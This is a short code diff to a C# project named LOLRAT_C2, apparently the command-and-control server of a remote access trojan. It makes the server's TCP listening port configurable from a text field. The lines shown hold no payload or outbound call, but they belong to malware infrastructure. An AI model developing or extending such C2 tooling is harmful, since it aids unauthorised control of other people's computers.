@@ -28,7 +28,8 @@ namespace LOLRAT_C2
         {
             try
             {
-                server = new TcpListener(IPAddress.Any, 12345);
+                int activePort = int.Parse(txtActivePort.Text);
+                TcpListener server = new TcpListener(IPAddress.Any, activePort);
                 server.Start();
                 isListening = true;
 
